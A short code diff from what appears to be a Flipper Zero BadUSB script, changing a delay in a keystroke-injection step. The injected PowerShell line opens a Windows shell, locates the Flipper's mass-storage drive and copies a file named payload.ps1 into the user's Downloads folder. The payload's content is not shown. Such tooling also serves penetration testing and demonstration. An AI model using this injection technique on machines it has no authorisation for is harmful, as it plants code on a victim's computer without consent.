@@ -38,7 +38,7 @@ badusb.press("GUI", "x");
 delay(300);
 badusb.press("i");
 delay(3000);
-badusb.println("Start-Sleep 10; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; Copy-Item -Path ${DriveLetter}:/payload.ps1 -Destination C:/Users/$env:username/Downloads; exit;");
+badusb.println("Start-Sleep 5; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; Copy-Item -Path ${DriveLetter}:/payload.ps1 -Destination C:/Users/$env:username/Downloads; exit;");
 badusb.quit();
 
 delay(2000);
